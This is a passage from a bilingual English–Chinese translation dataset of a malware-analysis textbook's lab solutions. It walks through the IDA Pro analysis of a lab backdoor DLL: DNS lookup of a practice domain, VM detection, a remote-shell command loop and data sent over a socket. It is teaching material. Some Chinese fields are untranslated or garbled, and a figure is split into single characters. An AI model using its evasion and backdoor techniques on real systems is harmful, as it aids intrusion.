    Sleep、WinExec、gethostbyname 以及许多其他网络功能调用。
- en: 14\. The malware will sleep for 30 seconds.
  id: totrans-1047
  prefs: []
  type: TYPE_NORMAL
  zh: 14. 恶意软件将休眠 30 秒。
- en: 15\. The arguments are 6, 1, and 2\.
  id: totrans-1048
  prefs: []
  type: TYPE_NORMAL
  zh: 15. 参数是 6、1 和 2。
- en: '16\. These arguments correspond to three symbolic constants: IPPROTO_TCP, SOCK_STREAM,
    and AF_INET.'
  id: totrans-1049
  prefs: []
  type: TYPE_NORMAL
  zh: 16. 这些参数对应于三个符号常量：IPPROTO_TCP、SOCK_STREAM 和 AF_INET。
- en: 17\. The in instruction is used for virtual machine detection at 0x100061DB,
    and the 0x564D5868h corresponds to the VMXh string. Using the cross-reference,
    we see the string Found Virtual Machine in the caller function.
  id: totrans-1050
  prefs: []
  type: TYPE_NORMAL
  zh: 17. 在 0x100061DB 处使用 in 指令进行虚拟机检测，0x564D5868h 对应于 VMXh 字符串。使用交叉引用，我们看到调用函数中有
    "Found Virtual Machine" 字符串。
- en: 18\. Random data appears to exist at 0x1001D988\.
  id: totrans-1051
  prefs: []
  type: TYPE_NORMAL
  zh: 18. 随机数据似乎存在于 0x1001D988 处。
- en: 19\. If you run *Lab05-01.py*, the random data is unobfuscated to reveal a string.
  id: totrans-1052
  prefs: []
  type: TYPE_NORMAL
  zh: 19. 如果你运行 *Lab05-01.py*，随机数据会被解密以显示一个字符串。
- en: '20\. By pressing the A key on the keyboard, we can turn this into the readable
    string: xdoor is this backdoor, string decoded for Practical Malware Analysis
    Lab :)1234\.'
  id: totrans-1053
  prefs: []
  type: TYPE_NORMAL
  zh: 20. 通过按键盘上的 A 键，我们可以将其转换为可读的字符串：xdoor 是这个后门，为 Practical Malware Analysis Lab
    解码的字符串 :)1234。
- en: 21\. The script works by XOR’ing 0x50 bytes of data with 0x55 and modifying
    the bytes in IDA Pro using PatchByte.
  id: totrans-1054
  prefs: []
  type: TYPE_NORMAL
  zh: 21. 脚本通过使用 XOR 对 0x50 字节数据与 0x55 进行异或操作，并使用 PatchByte 修改 IDA Pro 中的字节来工作。
- en: '**494**'
  id: totrans-1055
  prefs: []
  type: TYPE_NORMAL
  zh: '**494**'
- en: Appendix C
  id: totrans-1056
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1057
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 105](index-528_1.png)'
  id: totrans-1058
  prefs: []
  type: TYPE_IMG
  zh: '![Image 105](index-528_1.png)'
- en: '***Detailed Analysis***'
  id: totrans-1059
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: Once we load the malicious DLL into IDA Pro, we are taken directly to DllMain
    at 0x1000D02E. (You may need to display line numbers in the graph view by using
    **Options****General** and checking **Line Prefixes**, or you can toggle between
    the graph and traditional view by pressing the spacebar, which allows you to see
    the line numbers without changing the options.) DllMain is **5**
  id: totrans-1060
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们将恶意 DLL 加载到 IDA Pro 中，就会直接跳转到 DllMain 的 0x1000D02E 处。（您可能需要通过使用 **选项****常规**并检查
    **行前缀** 来在图形视图中显示行号，或者您可以通过按空格键在图形视图和传统视图之间切换，这允许您在不更改选项的情况下看到行号。）DllMain 是 **5**
- en: where we want to begin analysis, because all code that executes from the DllEntryPoint
    until DllMain has likely been generated by the compiler, and we don’t want to
    get bogged down analyzing compiler-generated code.
  id: totrans-1061
  prefs: []
  type: TYPE_NORMAL
  zh: 我们想要开始分析的地方，因为从 DllEntryPoint 到 DllMain 执行的所有代码很可能是由编译器生成的，我们不希望陷入分析编译器生成代码的困境。
- en: To answer questions 2 through 4, we begin by viewing the imports of this DLL,
    by selecting **View****Open Subviews****Imports**. In this list, we find gethostbyname
    and double-click it to see it in the disassembly. The gethostbyname import resides
    at location 0x100163CC in the .idata section of the binary.
  id: totrans-1062
  prefs: []
  type: TYPE_NORMAL
  zh: 为了回答第2至4个问题，我们首先查看此DLL的导入项，通过选择**查看****打开子视图****导入**。在这个列表中，我们找到gethostbyname并双击它以在反汇编中查看。gethostbyname导入位于二进制文件.idata部分的0x100163CC位置。
- en: To see the number of functions that call gethostbyname, we check its cross-references
    by pressing CTRL-X with the cursor on gethostbyname, which brings up the window
    shown in Figure 5-1L. The text “Line 1 of 18” at the bottom of the window tells
    us that there are nine cross-references for gethostbyname.
  id: totrans-1063
  prefs: []
  type: TYPE_NORMAL
  zh: 要查看调用gethostbyname的函数数量，我们通过在gethostbyname上按CTRL-X来检查其交叉引用，这将弹出一个窗口，如图5-1L所示。窗口底部的文本“第1行，共18行”告诉我们gethostbyname有九个交叉引用。
- en: 'Some versions of IDA Pro double-count cross-references: p is a reference because
    it is being called, and r is a reference because it is a “read” reference (since
    it is call dword ptr [...] for an import, the CPU must read the import and then
    call into it). Examining the cross-reference list closely, you can see that gethostbyname
    is called by five separate functions.'
  id: totrans-1064
  prefs: []
  type: TYPE_NORMAL
  zh: IDA Pro的一些版本会重复计算交叉引用：p是一个引用，因为它正在被调用，r是一个引用，因为它是一个“读取”引用（因为它为导入调用dword ptr
    [...]，CPU必须读取导入然后调用它）。仔细检查交叉引用列表，您可以看到gethostbyname被五个不同的函数调用。
- en: '*Figure 5-1L: Cross-references to gethostbyname*'
  id: totrans-1065
  prefs: []
  type: TYPE_NORMAL
  zh: '*图5-1L：gethostbyname的交叉引用*'
- en: We press G on the keyboard to quickly navigate to 0x10001757\. Once at this
    location, we see the following code, which calls gethostbyname.
  id: totrans-1066
  prefs: []
  type: TYPE_NORMAL
  zh: 我们按键盘上的G键快速导航到0x10001757。一旦到达这个位置，我们看到以下代码，它调用了gethostbyname。
- en: Solutions to Labs
  id: totrans-1067
  prefs: []
  type: TYPE_NORMAL
  zh: Solutions to Labs
- en: '**495**'
  id: totrans-1068
  prefs: []
  type: TYPE_NORMAL
  zh: '**495**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1069
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 106](index-529_1.png)'
  id: totrans-1070
  prefs: []
  type: TYPE_IMG
  zh: '![Image 106](index-529_1.png)'
- en: 1000174E mov eax, **off_10019040**
  id: totrans-1071
  prefs: []
  type: TYPE_NORMAL
  zh: 1000174E mov eax, **off_10019040**
- en: 10001753 add eax, 0Dh 
  id: totrans-1072
  prefs: []
  type: TYPE_NORMAL
  zh: 10001753 add eax, 0Dh 
- en: 10001756 push eax
  id: totrans-1073
  prefs: []
  type: TYPE_NORMAL
  zh: 10001756 push eax
- en: 10001757 call ds:**gethostbyname**
  id: totrans-1074
  prefs: []
  type: TYPE_NORMAL
  zh: 10001757 call ds:**gethostbyname**
- en: The gethostbyname method takes a single parameter—typically, a string containing
    a domain name. Therefore, we need to work backward and figure out what is in EAX
    when gethostbyname is called. It appears that off_10019040
  id: totrans-1075
  prefs: []
  type: TYPE_NORMAL
  zh: gethostbyname方法接受单个参数——通常是一个包含域名字符串。因此，我们需要向后工作并找出在调用gethostbyname时EAX中是什么。看起来off_10019040
- en: is moved into EAX. If we double-click that offset, we see the string [This is
    RDO]pics.practicalmalwareanalysis.com at that location.
  id: totrans-1076
  prefs: []
  type: TYPE_NORMAL
  zh: is moved into EAX。如果我们双击该偏移量，我们看到字符串[This is RDO]pics.practicalmalwareanalysis.com位于该位置。
- en: As you can see at , the pointer into the string is advanced by 0xD bytes, which
    gets a pointer to the string pics.practicalmalwareanalysis.com in EAX
  id: totrans-1077
  prefs: []
  type: TYPE_NORMAL
  zh: 如您所见在，指针在字符串中推进了0xD字节，这得到了指向字符串pics.practicalmalwareanalysis.com的指针存放在EAX中
- en: for the call to gethostbyname. Figure 5-2L shows the string in memory, and how
    adding 0xD to EAX advances the pointer to the location of the URL in memory. The
    call will perform a DNS request to get an IP address for the domain.
  id: totrans-1078
  prefs: []
  type: TYPE_NORMAL
  zh: 对于对gethostbyname的调用。图5-2L显示了内存中的字符串，以及将0xD加到EAX上如何将指针推进到内存中URL的位置。该调用将执行DNS请求以获取域的IP地址。
- en: EAX
  id: totrans-1079
  prefs: []
  type: TYPE_NORMAL
  zh: EAX
- en: EAX + 0xD
  id: totrans-1080
  prefs: []
  type: TYPE_NORMAL
  zh: EAX + 0xD
- en: '**[**'
  id: totrans-1081
  prefs: []
  type: TYPE_NORMAL
  zh: '**[**'
- en: '**T**'
  id: totrans-1082
  prefs: []
  type: TYPE_NORMAL
  zh: '**T**'
- en: '**h**'
  id: totrans-1083
  prefs: []
  type: TYPE_NORMAL
  zh: '**h**'
- en: '**i**'
  id: totrans-1084
  prefs: []
  type: TYPE_NORMAL
  zh: '**i**'
- en: '**s**'
  id: totrans-1085
  prefs: []
  type: TYPE_NORMAL
  zh: '**s**'
- en: '**i**'
  id: totrans-1086
  prefs: []
  type: TYPE_NORMAL
  zh: '**i**'
- en: '**s**'
  id: totrans-1087
  prefs: []
  type: TYPE_NORMAL
  zh: '**s**'
- en: '**R D O**'
  id: totrans-1088
  prefs: []
  type: TYPE_NORMAL
  zh: '**R D O**'
- en: '**]**'
  id: totrans-1089
  prefs: []
  type: TYPE_NORMAL
  zh: '**]**'
- en: p
  id: totrans-1090
  prefs: []
  type: TYPE_NORMAL
  zh: p
- en: i
  id: totrans-1091
  prefs: []
  type: TYPE_NORMAL
  zh: i
- en: c
  id: totrans-1092
  prefs: []
  type: TYPE_NORMAL
  zh: c
- en: s
  id: totrans-1093
  prefs: []
  type: TYPE_NORMAL
  zh: s
- en: .
  id: totrans-1094
  prefs: []
  type: TYPE_NORMAL
  zh: .
- en: p
  id: totrans-1095
  prefs: []
  type: TYPE_NORMAL
  zh: p
- en: r
  id: totrans-1096
  prefs: []
  type: TYPE_NORMAL
  zh: r
- en: a
  id: totrans-1097
  prefs: []
  type: TYPE_NORMAL
  zh: a
- en: c
  id: totrans-1098
  prefs: []
  type: TYPE_NORMAL
  zh: c
- en: t
  id: totrans-1099
  prefs: []
  type: TYPE_NORMAL
  zh: t
- en: i
  id: totrans-1100
  prefs: []
  type: TYPE_NORMAL
  zh: i
- en: c
  id: totrans-1101
  prefs: []
  type: TYPE_NORMAL
  zh: c
- en: a
  id: totrans-1102
  prefs: []
  type: TYPE_NORMAL
  zh: a
- en: l
  id: totrans-1103
  prefs: []
  type: TYPE_NORMAL
  zh: l
- en: m a
  id: totrans-1104
  prefs: []
  type: TYPE_NORMAL
  zh: m a
- en: l
  id: totrans-1105
  prefs: []
  type: TYPE_NORMAL
  zh: l
- en: w a
  id: totrans-1106
  prefs: []
  type: TYPE_NORMAL
  zh: w a
- en: r
  id: totrans-1107
  prefs: []
  type: TYPE_NORMAL
  zh: r
- en: e
  id: totrans-1108
  prefs: []
  type: TYPE_NORMAL
  zh: e
- en: a
  id: totrans-1109
  prefs: []
  type: TYPE_NORMAL
  zh: a
- en: n a
  id: totrans-1110
  prefs: []
  type: TYPE_NORMAL
  zh: n a
- en: l
  id: totrans-1111
  prefs: []
  type: TYPE_NORMAL
  zh: l
- en: y
  id: totrans-1112
  prefs: []
  type: TYPE_NORMAL
  zh: y
- en: s
  id: totrans-1113
  prefs: []
  type: TYPE_NORMAL
  zh: s
- en: i
  id: totrans-1114
  prefs: []
  type: TYPE_NORMAL
  zh: i
- en: s
  id: totrans-1115
  prefs: []
  type: TYPE_NORMAL
  zh: s
- en: .
  id: totrans-1116
  prefs: []
  type: TYPE_NORMAL
  zh: .
- en: c
  id: totrans-1117
  prefs: []
  type: TYPE_NORMAL
  zh: c
- en: o m
  id: totrans-1118
  prefs: []
  type: TYPE_NORMAL
  zh: o m
- en: '*Figure 5-2L: Adjustment of the string pointer to access the URL*'
  id: totrans-1119
  prefs: []
  type: TYPE_NORMAL
  zh: '*图5-2L：调整字符串指针以访问URL*'
- en: To answer questions 5 and 6,
  id: totrans-1120
  prefs: []
  type: TYPE_NORMAL
  zh: To answer questions 5 and 6,
- en: we press G on the keyboard to navi-
  id: totrans-1121
  prefs: []
  type: TYPE_NORMAL
  zh: we press G on the keyboard to navi-
- en: gate to 0x10001656 in order to ana-
  id: totrans-1122
  prefs: []
  type: TYPE_NORMAL
  zh: gate到0x10001656以便分析
- en: lyze sub_10001656\. In Figure 5-3L, we
  id: totrans-1123
  prefs: []
  type: TYPE_NORMAL
  zh: ylyze sub_10001656\. 在图5-3L中，我们看到
- en: see what IDA Pro has done to rec-
  id: totrans-1124
  prefs: []
  type: TYPE_NORMAL
  zh: see what IDA Pro has done to rec-
- en: ognize and label the function’s
  id: totrans-1125
  prefs: []
  type: TYPE_NORMAL
  zh: ognize and label the function’s
- en: local variables and parameters. The
  id: totrans-1126
  prefs: []
  type: TYPE_NORMAL
  zh: local variables and parameters. The
- en: labeled local variables correspond
  id: totrans-1127
  prefs: []
  type: TYPE_NORMAL
  zh: labeled local variables correspond
- en: to negative offsets, and we count
  id: totrans-1128
  prefs: []
  type: TYPE_NORMAL
  zh: 到负偏移量，我们用正偏移量计数，并且我们
- en: 23 of them, most of which are pre-
  id: totrans-1129
  prefs: []
  type: TYPE_NORMAL
  zh: 23 of them, most of which are pre-
- en: pended with var_. The freeware ver-
  id: totrans-1130
  prefs: []
  type: TYPE_NORMAL
  zh: pended with var_。免费版
- en: sion of IDA Pro counts only 20 local
  id: totrans-1131
  prefs: []
  type: TYPE_NORMAL
  zh: sion of IDA Pro只计算20个局部
- en: variables, so the version you are
  id: totrans-1132
  prefs: []
  type: TYPE_NORMAL
  zh: 变量，所以你
- en: using may detect a slightly different
  id: totrans-1133
  prefs: []
  type: TYPE_NORMAL
  zh: using may detect a slightly different
- en: number of local variables. The
  id: totrans-1134
  prefs: []
  type: TYPE_NORMAL
  zh: number of local variables. The
- en: parameters are labeled and refer-
  id: totrans-1135
  prefs: []
  type: TYPE_NORMAL
  zh: parameters are labeled and refer-
- en: enced with positive offsets, and we
  id: totrans-1136
  prefs: []
  type: TYPE_NORMAL
  zh: enced with positive offsets, and we
- en: see that IDA Pro has recognized
  id: totrans-1137
  prefs: []
  type: TYPE_NORMAL
  zh: see that IDA Pro has recognized
- en: '*Figure 5-3L: IDA Pro function layout—*'
  id: totrans-1138
  prefs: []
  type: TYPE_NORMAL
  zh: '*图5-3L：IDA Pro函数布局—*'
- en: one parameter for the function
  id: totrans-1139
  prefs: []
  type: TYPE_NORMAL
  zh: one parameter for the function
- en: '*recognizing local variables and parameters*'
  id: totrans-1140
  prefs: []
  type: TYPE_NORMAL
  zh: '*recognizing local variables and parameters*'
- en: labeled arg_0\.
  id: totrans-1141
  prefs: []
  type: TYPE_NORMAL
  zh: labeled arg_0\.
- en: '**496**'
  id: totrans-1142
  prefs: []
  type: TYPE_NORMAL
  zh: '**496**'
- en: Appendix C
  id: totrans-1143
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1144
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: To answer questions 7 through 10, we begin by viewing the strings for this DLL
    by selecting **View****Open Subviews****Strings**. In this list, double-click
    \cmd.exe /c to see it in the disassembly. Notice that the string resides in the
    xdoors_d section of the PE file at 0x10095B34\. On checking the cross-references
    to this string, we see that there is only one at 0x100101D0, where this string
    is pushed onto the stack.
  id: totrans-1145
  prefs: []
  type: TYPE_NORMAL
  zh: To answer questions 7 through 10, we begin by viewing the strings for this DLL
    by selecting **View****Open Subviews****Strings**. In this list, double-click
    \cmd.exe /c to see it in the disassembly. Notice that the string resides in the
    xdoors_d section of the PE file at 0x10095B34\. On checking the cross-references
    to this string, we see that there is only one at 0x100101D0, where this string
    is pushed onto the stack.
- en: Examining the graph view of this function shows a series of memcmp func-5
  id: totrans-1146
  prefs: []
  type: TYPE_NORMAL
  zh: Examining the graph view of this function shows a series of memcmp func-5
- en: tions that are comparing strings such as cd, exit, install, inject, and uptime.
  id: totrans-1147
  prefs: []
  type: TYPE_NORMAL
  zh: tions that are comparing strings such as cd, exit, install, inject, and uptime.
- en: We also see that the string reference earlier in the function at 0x1001009D
  id: totrans-1148
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还看到，在函数中较早的位置（0x1001009D）的字符串引用
- en: contains the string This Remote Shell Session. Examining the function and the
    calls it makes shows a series of calls to recv and send. Using these three pieces
    of evidence, we can guess that we are looking at a remote shell session function.
  id: totrans-1149
  prefs: []
  type: TYPE_NORMAL
  zh: contains the string This Remote Shell Session. Examining the function and the
    calls it makes shows a series of calls to recv and send. Using these three pieces
    of evidence, we can guess that we are looking at a remote shell session function.
- en: The dword_1008E5C4 is a global variable that we can double-click (at 0x100101C8)
    to show its location in memory at 0x1008E5C4, within the
  id: totrans-1150
  prefs: []
  type: TYPE_NORMAL
  zh: The dword_1008E5C4 is a global variable that we can double-click (at 0x100101C8)
    to show its location in memory at 0x1008E5C4, within the
- en: .data section of the DLL. Checking the cross-references by pressing CTRL**-**X
  id: totrans-1151
  prefs: []
  type: TYPE_NORMAL
  zh: .data section of the DLL. Checking the cross-references by pressing CTRL**-**X
- en: shows that it is referenced three times, but only one reference modifies dword_1008E5C4\.
    The following listing shows how dword_1008E5C4 is modified.
  id: totrans-1152
  prefs: []
  type: TYPE_NORMAL
  zh: 显示它被引用了三次，但只有一次引用修改了dword_1008E5C4。以下列表显示了dword_1008E5C4是如何被修改的。
- en: 10001673 call sub_10003695
  id: totrans-1153
  prefs: []
  type: TYPE_NORMAL
  zh: 10001673 call sub_10003695
- en: 10001678 mov dword_1008E5C4, eax
  id: totrans-1154
  prefs: []
  type: TYPE_NORMAL
  zh: 10001678 mov dword_1008E5C4, eax
- en: We see that EAX is moved into dword_1008E5C4, and that EAX is the return value
    from the function call made in the previous instruction.
  id: totrans-1155
  prefs: []
  type: TYPE_NORMAL
  zh: We see that EAX is moved into dword_1008E5C4, and that EAX is the return value
    from the function call made in the previous instruction.
- en: Therefore, we need to determine what that function returns. To do so, we examine
    sub_10003695 by double-clicking it and looking at the disassembly.
  id: totrans-1156
  prefs: []
  type: TYPE_NORMAL
  zh: Therefore, we need to determine what that function returns. To do so, we examine
    sub_10003695 by double-clicking it and looking at the disassembly.
- en: The sub_10003695 function contains a call to GetVersionEx, which obtains information
    about the current version of the OS, as shown in the following listing.
  id: totrans-1157
  prefs: []
  type: TYPE_NORMAL
  zh: The sub_10003695 function contains a call to GetVersionEx, which obtains information
    about the current version of the OS, as shown in the following listing.
- en: 100036AF call ds:**GetVersionExA**
  id: totrans-1158
  prefs: []
  type: TYPE_NORMAL
  zh: 100036AF call ds:**GetVersionExA**
- en: 100036B5 xor eax, eax
  id: totrans-1159
  prefs: []
  type: TYPE_NORMAL
  zh: 100036B5 xor eax, eax
- en: 100036B7 cmp [ebp+VersionInformation.dwPlatformId], 2
  id: totrans-1160
  prefs: []
  type: TYPE_NORMAL
  zh: 100036B7 cmp [ebp+VersionInformation.dwPlatformId], 2
- en: 100036BE setz al
  id: totrans-1161
  prefs: []
  type: TYPE_NORMAL
  zh: 100036BE setz al
- en: The dwPlatformId is compared to the number 2 in order to determine how to set
    the AL register. AL will be set if the PlatformId is VER_PLATFORM_WIN32_NT.
  id: totrans-1162
  prefs: []
  type: TYPE_NORMAL
  zh: The dwPlatformId is compared to the number 2 in order to determine how to set
    the AL register. AL will be set if the PlatformId is VER_PLATFORM_WIN32_NT.
- en: This is just a simple check to make sure that the OS is Windows 2000 or higher,
    and we can conclude that the global variable will typically be set to 1\.
  id: totrans-1163
  prefs: []
  type: TYPE_NORMAL
  zh: This is just a simple check to make sure that the OS is Windows 2000 or higher,
    and we can conclude that the global variable will typically be set to 1\.
- en: 'As previously discussed, the remote shell function at 0x1000FF58 contains a
    series of memcmp functions starting at 0x1000FF58\. At 0x10010452, we see the
    memcmp with robotwork, as follows:'
  id: totrans-1164
  prefs: []
  type: TYPE_NORMAL
  zh: 'As previously discussed, the remote shell function at 0x1000FF58 contains a
    series of memcmp functions starting at 0x1000FF58\. At 0x10010452, we see the
    memcmp with robotwork, as follows:'
- en: 10010444 push 9 ; Size
  id: totrans-1165
  prefs: []
  type: TYPE_NORMAL
  zh: 10010444 push 9 ; Size
- en: 10010446 lea eax, [ebp+Dst]
  id: totrans-1166
  prefs: []
  type: TYPE_NORMAL
  zh: 10010446 lea eax, [ebp+Dst]
- en: 1001044C push offset aRobotwork ; "robotwork"
  id: totrans-1167
  prefs: []
  type: TYPE_NORMAL
  zh: 1001044C push offset aRobotwork ; "robotwork"
- en: 10010451 push eax ; Buf1
  id: totrans-1168
  prefs: []
  type: TYPE_NORMAL
  zh: 10010451 push eax ; Buf1
- en: 10010452 call memcmp
  id: totrans-1169
  prefs: []
  type: TYPE_NORMAL
  zh: 10010452 call memcmp
- en: Solutions to Labs
  id: totrans-1170
  prefs: []
  type: TYPE_NORMAL
  zh: Solutions to Labs
- en: '**497**'
  id: totrans-1171
  prefs: []
  type: TYPE_NORMAL
  zh: '**497**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1172
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 107](index-531_1.png)'
  id: totrans-1173
  prefs: []
  type: TYPE_IMG
  zh: '![Image 107](index-531_1.png)'
- en: 10010457 add esp, 0Ch
  id: totrans-1174
  prefs: []
  type: TYPE_NORMAL
  zh: 10010457 add esp, 0Ch
- en: 1001045A test eax, eax
  id: totrans-1175
  prefs: []
  type: TYPE_NORMAL
  zh: 1001045A test eax, eax
- en: 1001045C jnz short loc_10010468 
  id: totrans-1176
  prefs: []
  type: TYPE_NORMAL
  zh: 1001045C jnz short loc_10010468 
- en: 1001045E push [ebp+s]  ; s
  id: totrans-1177
  prefs: []
  type: TYPE_NORMAL
  zh: 1001045E push [ebp+s]  ; s
- en: 10010461 call sub_100052A2 
  id: totrans-1178
  prefs: []
  type: TYPE_NORMAL
  zh: 10010461 call sub_100052A2 
- en: The jnz at  will not be taken if the string matches robotwork, and the call
    at  will be called. Examining sub_100052A2, we see that it queries the registry
    at HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WorkTime and WorkTimes, and
    then returns this information over the network socket that was passed to the function
    at .
  id: totrans-1179
  prefs: []
  type: TYPE_NORMAL
  zh: 在处的jnz不会被执行，如果字符串匹配robotwork，则处的调用将被执行。检查sub_100052A2，我们看到它查询HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WorkTime和WorkTimes注册表，然后通过传递给函数的处的网络套接字返回此信息。
- en: To answer question 11, we begin by viewing the exports for this DLL
  id: totrans-1180
  prefs: []
  type: TYPE_NORMAL
  zh: 要回答第11个问题，我们首先查看这个DLL的导出
- en: by selecting **View****Open Subviews****Exports**. We find PSLIST in this
    list and double-click it to move the cursor to 0x10007025, the start of the export’s
    code. This function appears to take one of two paths, depending on the result
    of sub_100036C3\. The sub_100036C3 function checks to see if the OS version is
    Windows Vista/7 or XP/2003/2000\. Both code paths use CreateToolhelp32Snapshot
    to help them grab a process listing, which we infer from the strings and API calls.
    Both code paths return the process listing over the socket using send.
  id: totrans-1181
  prefs: []
  type: TYPE_NORMAL
  zh: 通过选择**视图****打开子视图****导出**。我们在列表中找到PSLIST并双击它，将光标移动到0x10007025，这是导出代码的开始。这个函数似乎有两种路径，取决于sub_100036C3的结果。sub_100036C3函数检查操作系统版本是否为Windows
    Vista/7或XP/2003/2000。两个代码路径都使用CreateToolhelp32Snapshot来帮助它们获取进程列表，我们从字符串和API调用中推断出来。两个代码路径都使用send通过套接字返回进程列表。
- en: To answer questions 12 and 13, we graph a function’s cross-references by selecting
    **View****Graphs****Xrefs From** when the cursor is on the function name of
    interest. We go to sub_10004E79 by pressing G on the keyboard and entering **0x10004E79**.
  id: totrans-1182
  prefs: []
  type: TYPE_NORMAL
  zh: 要回答第12和第13个问题，我们在函数名上选择**视图****图形****从...查看交叉引用**，然后通过按键盘上的G键并输入**0x10004E79**来转到sub_10004E79。
- en: Figure 5-4L shows the result of graphing the cross-references for sub_10004E79\.
    We see that this function calls GetSystemDefaultLangID and send.
  id: totrans-1183
  prefs: []
  type: TYPE_NORMAL
  zh: 图5-4L显示了为sub_10004E79绘制交叉引用的结果。我们看到这个函数调用了GetSystemDefaultLangID和send。
- en: This information tells us that the function likely sends the language identifier
    over a network socket, so we can right-click the function name and give it a more
    meaningful name, such as send_languageID.
  id: totrans-1184
  prefs: []
  type: TYPE_NORMAL
  zh: 这条信息告诉我们该函数可能通过网络套接字发送语言标识符，因此我们可以右键单击函数名并给它一个更有意义的名称，例如send_languageID。
- en: '**NOTE**'
  id: totrans-1185
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*Performing a quick analysis like this is an easy way to get a high-level overview
    of a* *binary. This approach is particularly handy when analyzing large binaries.*'
  id: totrans-1186
  prefs: []
  type: TYPE_NORMAL
  zh: '*进行这样的快速分析是了解* *二进制文件* *的高级概述的简单方法。这种方法在分析大型二进制文件时尤其有用。*'
- en: '*Figure 5-4L: Graph of cross-references from sub_10004E79*'
  id: totrans-1187
  prefs: []
  type: TYPE_NORMAL
  zh: '*图5-4L：从sub_10004E79的交叉引用图*'
- en: '**498**'
  id: totrans-1188
  prefs: []
  type: TYPE_NORMAL
  zh: '**498**'
- en: Appendix C
  id: totrans-1189
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1190
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 108](index-532_1.png)'
  id: totrans-1191
  prefs: []
  type: TYPE_IMG
  zh: '![Image 108](index-532_1.png)'
- en: '![Image 109](index-532_2.png)'
  id: totrans-1192
  prefs: []
  type: TYPE_IMG
  zh: '![Image 109](index-532_2.png)'
- en: To determine how many Windows API
  id: totrans-1193
  prefs: []
  type: TYPE_NORMAL
  zh: 要确定Windows API
- en: functions DllMain calls directly, we scroll
  id: totrans-1194
  prefs: []
  type: TYPE_NORMAL
  zh: DllMain直接调用的函数中可见，我们滚动
- en: through the method and look for API calls,
  id: totrans-1195
  prefs: []
  type: TYPE_NORMAL
  zh: 通过该方法查找API调用，
- en: or select **View****Graphs****Xrefs From** to open the dialog shown in Figure
    5-5L.
  id: totrans-1196
  prefs: []
  type: TYPE_NORMAL
  zh: 或者选择**视图****图形****从...查看交叉引用**以打开图5-5L所示的对话框。
- en: The start and end address should corre-
  id: totrans-1197
  prefs: []
  type: TYPE_NORMAL
  zh: 起始地址和结束地址应该对应
- en: spond to the start of DllMain—specifically,
  id: totrans-1198
  prefs: []
  type: TYPE_NORMAL
  zh: spond to the start of DllMain—specifically,
- en: '**5**'
  id: totrans-1199
  prefs: []
  type: TYPE_NORMAL
  zh: '**5**'
- en: 0x1000D02E. Because we care only about the
  id: totrans-1200
  prefs: []
  type: TYPE_NORMAL
  zh: 0x1000D02E. 因为我们只关心
- en: cross-references *from* DllMain, we select a recursion depth of 1 to display
    only the functions
  id: totrans-1201
  prefs: []
  type: TYPE_NORMAL
  zh: 从DllMain的交叉引用，我们选择递归深度为1以仅显示函数
- en: that DllMain calls directly. Figure 5-6L shows the
  id: totrans-1202
  prefs: []
  type: TYPE_NORMAL
  zh: 直接调用的DllMain。图5-6L显示了
- en: resulting graph. (The API calls are seen in
  id: totrans-1203
  prefs: []
  type: TYPE_NORMAL
  zh: 的结果图。（API调用在
- en: gray.) To see all functions called at a recursive
  id: totrans-1204
  prefs: []
  type: TYPE_NORMAL
  zh: 灰色。）要查看递归调用中调用的所有函数，
- en: depth of 2, follow the same steps and select a
  id: totrans-1205
  prefs: []
  type: TYPE_NORMAL
  zh: 深度为2，遵循相同的步骤并选择
- en: recursion depth of 2\. The result will be a much
  id: totrans-1206
  prefs: []
  type: TYPE_NORMAL
  zh: 递归深度为2。结果将是一个更
- en: larger graph, which even shows a recursive call
  id: totrans-1207
  prefs: []
  type: TYPE_NORMAL
  zh: 更大的图，甚至显示了递归调用
- en: back to DllMain.
  id: totrans-1208
  prefs: []
  type: TYPE_NORMAL
  zh: 返回到DllMain。
- en: '*Figure 5-5L: Dialog for setting*'
  id: totrans-1209
  prefs: []
  type: TYPE_NORMAL
  zh: '*图5-5L：设置对话框*'
- en: '*a custom cross-reference graph*'
  id: totrans-1210
  prefs: []
  type: TYPE_NORMAL
  zh: '*一个自定义的交叉引用图*'
- en: '*from 0x1000D02E*'
  id: totrans-1211
  prefs: []
  type: TYPE_NORMAL
  zh: '*从0x1000D02E*'
- en: '*Figure 5-6L: Cross-reference graph for DllMain with a recursive depth of 1*'
  id: totrans-1212
  prefs: []
  type: TYPE_NORMAL
  zh: '*图5-6L：DllMain的交叉引用图，递归深度为1*'
- en: As referenced in question 14, there is a call to Sleep at 0x10001358, as shown
    in the following listing. Sleep takes one parameter—the number of milliseconds
    to sleep—and we see it pushed on the stack as EAX.
  id: totrans-1213
  prefs: []
  type: TYPE_NORMAL
  zh: 如第14题所述，在0x10001358处有一个调用Sleep，如下所示。Sleep接受一个参数——休眠的毫秒数——我们看到它作为EAX压入堆栈。
- en: 10001341 mov eax, **off_10019020**
  id: totrans-1214
  prefs: []
  type: TYPE_NORMAL
  zh: 10001341 mov eax, **off_10019020**
- en: 10001346 add eax, 0Dh
  id: totrans-1215
  prefs: []
  type: TYPE_NORMAL
  zh: 10001346 add eax, 0Dh
- en: 10001349 push eax ; Str
  id: totrans-1216
  prefs: []
  type: TYPE_NORMAL
